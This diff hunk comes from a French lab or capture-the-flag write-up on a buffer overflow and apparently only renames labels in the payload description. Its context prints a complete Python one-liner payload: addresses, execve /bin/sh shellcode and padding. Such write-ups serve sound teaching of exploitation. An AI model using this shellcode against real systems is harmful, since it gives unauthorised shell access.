@@ -169,7 +169,7 @@ Breakpoint 1, 0x0804867c in main ()
 La valeur de l'adresse de depart de notre buffer en `0x10(%esp)` (+136) sera remplacé par 0x804a00c
 
 Puis a la suite notre payload sera composé ainsi:
-> shell_addr (4 bytes) + shellcode (28 bytes) + padding (76 bytes) + buffer_addr (4 bytes)
+> adresse shell (4 bytes) + shellcode (28 bytes) + padding (76 bytes) + adresse du buffer (4 bytes)
 
 On ecrit donc notre exploit en python, ce qui nous donne:
 > $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\04\x08"')
